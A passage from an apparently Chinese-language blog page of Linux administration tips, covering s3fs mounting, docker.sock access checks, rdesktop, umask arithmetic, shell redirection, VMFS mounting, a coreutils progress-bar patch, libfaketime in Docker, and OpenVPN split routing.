</span></span><span class="line"><span class="cl">$&gt; s3fs s3空间名 /mnt/s3fs -o <span class="nv">passwd_file</span><span class="o">=</span>/mnt/.passwd-s3fs -o <span class="nv">url</span><span class="o">=</span>http://s3-cn-north-1.qiniucs.com -o use_path_request_style   <span class="c1"># -o dbglevel=info -f -o curldbg # 日志信息</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="普通用户校验是否有权限通过dockersock操作-docker" class="heading-element"><span>普通用户校验是否有权限通过docker.sock操作 docker</span>
  <a href="#%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%a0%a1%e9%aa%8c%e6%98%af%e5%90%a6%e6%9c%89%e6%9d%83%e9%99%90%e9%80%9a%e8%bf%87dockersock%e6%93%8d%e4%bd%9c-docker" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">zabbix</span> <span class="n">curl</span> <span class="o">--</span><span class="n">unix</span><span class="o">-</span><span class="n">socket</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">.</span><span class="n">sock</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">buffer</span> <span class="o">-</span><span class="n">XGET</span> <span class="n">v1</span><span class="o">.</span><span class="mi">24</span><span class="o">/</span><span class="n">_ping</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rdesktop-远程桌面工具安装" class="heading-element"><span>rdesktop 远程桌面工具安装</span>
  <a href="#rdesktop-%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>rdesktop 用于linux下的rdp工具，还是非常好用的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$&gt; sudo dnf install rdesktop
</span></span><span class="line"><span class="cl">$&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &lt;server_ip&gt;:&lt;port&gt; -p&lt;password&gt;</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="umask-计算方法" class="heading-element"><span>Umask 计算方法</span>
  <a href="#umask-%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>当创建目录时候，<code>目录创建后的权限</code> =  <code>默认目录最大权限(777)</code> - <code>umask 权限</code>
<ul>
<li><code>umask=0022 --&gt; 777 - 022 = 755(目录权限)</code></li>
</ul>
</li>
<li>当创建文件时候，若<code>umask</code>值所有位数为偶数，则 <code>文件创建后的权限</code> = <code>默认文件最大权限(666)</code> - <code>umask权限</code>
<ul>
<li><code>umask = 0022 --&gt; 666 - 022 = 644(文件权限)</code></li>
</ul>
</li>
<li>当创建文件时候，若<code>umask</code>值部分或全部为奇数时候，则 <code>文件创建后的权限</code> = <code>默认文件最大权限(666)</code> - <code>umask权限</code> + <code>umask基数位+1</code>
<ul>
<li><code>umask = 0045 --&gt; 666 - 045 = (621 + 001) = 622</code></li>
<li><code>umask = 0033 --&gt; 666 - 033 = (633 + 011) = 644</code></li>
</ul>
</li>
</ul>
<h2 id="输入输出重定向" class="heading-element"><span>输入输出重定向</span>
  <a href="#%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e9%87%8d%e5%ae%9a%e5%90%91" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 id="文件描述符" class="heading-element"><span>文件描述符</span>
  <a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><table>
  <thead>
      <tr>
          <th style="text-align: left">文件描述符</th>
          <th style="text-align: left">文件名</th>
          <th style="text-align: left">类型</th>
          <th style="text-align: left">硬件</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><code>0</code></td>
          <td style="text-align: left"><code>stdin</code></td>
          <td style="text-align: left">标准输入文件</td>
          <td style="text-align: left">键盘</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>1</code></td>
          <td style="text-align: left"><code>stdout</code></td>
          <td style="text-align: left">标准输出文件</td>
          <td style="text-align: left">显示器</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>2</code></td>
          <td style="text-align: left"><code>stderr</code></td>
          <td style="text-align: left">标准错误输出文件</td>
          <td style="text-align: left">显示器</td>
      </tr>
  </tbody>
</table>
<h2 id="标准重定向" class="heading-element"><span>标准重定向</span>
  <a href="#%e6%a0%87%e5%87%86%e9%87%8d%e5%ae%9a%e5%90%91" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://aimuke.github.io/linux/2019/05/29/redirect/"target="_blank" rel="external nofollow noopener noreferrer">https://aimuke.github.io/linux/2019/05/29/redirect/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<table>
  <thead>
      <tr>
          <th style="text-align: left">类型</th>
          <th style="text-align: left">表现形式</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">标准输入重定向</td>
          <td style="text-align: left"><code>0&lt;</code>或<code>&lt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">追加输入重定向</td>
          <td style="text-align: left"><code>0&lt;&lt;</code>或<code>&lt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">标准输出重定向</td>
          <td style="text-align: left"><code>1&gt;</code>或<code>&gt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">标准输出追加重定向</td>
          <td style="text-align: left"><code>1&gt;&gt;</code>或<code>&gt;&gt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">标准错误重定向</td>
          <td style="text-align: left"><code>2&gt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">标准错误追加重定向</td>
          <td style="text-align: left"><code>2&gt;&gt;</code></td>
      </tr>
      <tr>
          <td style="text-align: left">标准错误重定向到标准输出</td>
          <td style="text-align: left"><code>2&gt;&amp;1</code>，<code>(cmd &gt; /dev/null 2&gt;&amp;1) == (cmd &gt;&amp; /dev/null) == (cmd &amp;&gt; /dev/null)</code></td>
      </tr>
  </tbody>
</table>
<h2 id="linux-下挂载-esxi-的-vmfs-文件系统" class="heading-element"><span>linux 下挂载 esxi 的 vmfs 文件系统</span>
  <a href="#linux-%e4%b8%8b%e6%8c%82%e8%bd%bd-esxi-%e7%9a%84-vmfs-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>vmfs</code> 是<code>esxi</code>的文件系统,物理机使用<code>esxi</code>虚拟化后硬盘的文件格式就是这个. <code>linux</code>下可以直接将其挂在到本地
<code>vmfs-tools</code>是<code>linux</code>挂载<code>vmfs</code>的驱动程序(应该也可以挂在<code>vmdk</code>文件,<em>我没有试过</em>),默认在<code>ubuntu</code>上已获得支持,<code>fedora</code>上可以直接将<code>ubuntu</code>上的安装程序复制过来也可以直接使用.</p>
<blockquote>
<p><a href="https://github.com/glandium/vmfs-tools"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/glandium/vmfs-tools<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 安装后挂载  </span>
</span></span><span class="line"><span class="cl">vmfs-fuse /dev/sdc1 /mnt/sdc </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="cp-mv-进度条补丁" class="heading-element"><span>cp mv 进度条补丁</span>
  <a href="#cp-mv-%e8%bf%9b%e5%ba%a6%e6%9d%a1%e8%a1%a5%e4%b8%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 注意尽量不要使用 root 用户操作</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 下载coreutils</span>
</span></span><span class="line"><span class="cl">$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz
</span></span><span class="line"><span class="cl">$ tar -xJf coreutils-8.32.tar.xz
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> coreutils-8.32/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 下载 github 上的补丁</span>
</span></span><span class="line"><span class="cl">$ wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch
</span></span><span class="line"><span class="cl"><span class="c1"># 打补丁，实现进度条显示</span>
</span></span><span class="line"><span class="cl">$ patch -p1 -i advcpmv-0.8-8.32.patch
</span></span><span class="line"><span class="cl">patching file src/copy.c
</span></span><span class="line"><span class="cl">patching file src/copy.h
</span></span><span class="line"><span class="cl">patching file src/cp.c
</span></span><span class="line"><span class="cl">patching file src/mv.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 编译安装</span>
</span></span><span class="line"><span class="cl">$ ./configure
</span></span><span class="line"><span class="cl">$ make
</span></span><span class="line"><span class="cl"><span class="c1"># 将打补丁生成的cp和mv命令的二进制文件复制到bin目录下</span>
</span></span><span class="line"><span class="cl">$ sudo cp src/cp /usr/local/bin/cp
</span></span><span class="line"><span class="cl">$ sudo cp src/mv /usr/local/bin/mv</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="更改docker容器中的时间而不影响宿主机" class="heading-element"><span>更改docker容器中的时间而不影响宿主机</span>
  <a href="#%e6%9b%b4%e6%94%b9docker%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84%e6%97%b6%e9%97%b4%e8%80%8c%e4%b8%8d%e5%bd%b1%e5%93%8d%e5%ae%bf%e4%b8%bb%e6%9c%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; git clone https://github.com/wolfcw/libfaketime.git
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">cd</span> libfaketime
</span></span><span class="line"><span class="cl">$&gt; make 
</span></span><span class="line"><span class="cl">$&gt; docker cp ./src/libfaketime.so.1 centos:/usr/lib/
</span></span><span class="line"><span class="cl">$&gt; docker <span class="nb">exec</span> -it centos bash 
</span></span><span class="line"><span class="cl"><span class="c1"># 修改为指定时间</span>
</span></span><span class="line"><span class="cl">$&gt;&gt; <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>/usr/lib/libfaketime.so.1 <span class="nv">FAKETIME</span><span class="o">=</span><span class="s2">&#34;2020-05-01 00:01:00&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 修改为几天后 </span>
</span></span><span class="line"><span class="cl">$&gt;&gt; <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>/usr/lib/libfaketime.so.1 <span class="nv">FAKETIME</span><span class="o">=</span><span class="s2">&#34;+2d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 恢复 </span>
</span></span><span class="line"><span class="cl">$&gt;&gt; <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ubuntudebian切换shelldashbash" class="heading-element"><span>ubuntu/debian切换shell（dash/bash）</span>
  <a href="#ubuntudebian%e5%88%87%e6%8d%a2shelldashbash" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; dpkg-reconfigure dash
</span></span><span class="line"><span class="cl"><span class="c1"># 弹出窗口选择 &lt;No&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="openvpn-指定路由配置" class="heading-element"><span>openvpn 指定路由配置</span>
  <a href="#openvpn-%e6%8c%87%e5%ae%9a%e8%b7%af%e7%94%b1%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://blog.csdn.net/joshua317/article/details/120245443"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/joshua317/article/details/120245443<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 在 verb 3 下添加</span>
</span></span><span class="line"><span class="cl">route-nopull    <span class="c1">#  route-nopull 配置后不会有任何网络请求走openvpn</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 当客户端加入 route-nopull 后,所有出去的访问都不从 Openvpn 出去,但可通过添加 vpn_gateway 参数使部分IP访问走 Openvpn 出去</span>
</span></span><span class="line"><span class="cl">route 172.16.0.0 255.255.0.0  vpn_gateway           
</span></span><span class="line"><span class="cl">route 140.143.61.12 255.255.255.255  vpn_gateway</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="svg-背景透明图片" class="heading-element"><span>svg 背景透明图片</span>
  <a href="#svg-%e8%83%8c%e6%99%af%e9%80%8f%e6%98%8e%e5%9b%be%e7%89%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span> <span class="na">id=</span><span class="s">&#34;Layer_1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">x=</span><span class="s">&#34;0px&#34;</span> <span class="na">y=</span><span class="s">&#34;0px&#34;</span> <span class="na">width=</span><span class="s">&#34;250px&#34;</span> <span class="na">height=</span><span class="s">&#34;269px&#34;</span> <span class="na">viewBox=</span><span class="s">&#34;0 0 250 269&#34;</span> <span class="na">enable-background=</span><span class="s">&#34;new 0 0 250 269&#34;</span> <span class="na">xml:space=</span><span class="s">&#34;preserve&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;image</span> <span class="na">id=</span><span class="s">&#34;image0&#34;</span> <span class="na">width=</span><span class="s">&#34;250&#34;</span> <span class="na">height=</span><span class="s">&#34;269&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;0&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">href=</span><span class="s">&#34;data:image/png;base64,&lt;base64 code&gt;&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="centos-启用zram服务器内存过低可用于替代swap" class="heading-element"><span>CentOS 启用zram(服务器内存过低，可用于替代swap)</span>
  <a href="#centos-%e5%90%af%e7%94%a8zram%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%86%85%e5%ad%98%e8%bf%87%e4%bd%8e%e5%8f%af%e7%94%a8%e4%ba%8e%e6%9b%bf%e4%bb%a3swap" class="heading-mark">
